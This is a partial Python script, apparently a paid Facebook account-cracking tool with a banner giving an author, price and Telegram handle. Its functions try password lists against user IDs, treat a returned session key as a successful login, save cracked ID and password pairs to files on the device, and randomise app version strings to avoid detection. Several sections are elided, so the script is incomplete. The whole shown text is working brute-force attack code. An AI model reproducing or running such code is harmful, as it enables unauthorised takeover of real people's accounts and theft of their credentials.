...
\_______)(_)|/     \|(_)(____/   
   ░
\033[0;37m════════════════════════════════════════\033[0;37m
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m AUTHOR    : ARO
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m TOOL TYPE : 5$
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m VERSION   : 5.0.0
\033[0;37m[\x1b[1;92m∎\033[0;37m]\033[0;37m TELEGRAM  : @oo8u6'"""'')
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [MR_JAMAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [JAMAL_OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [JAMAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JAMAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JAMAL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
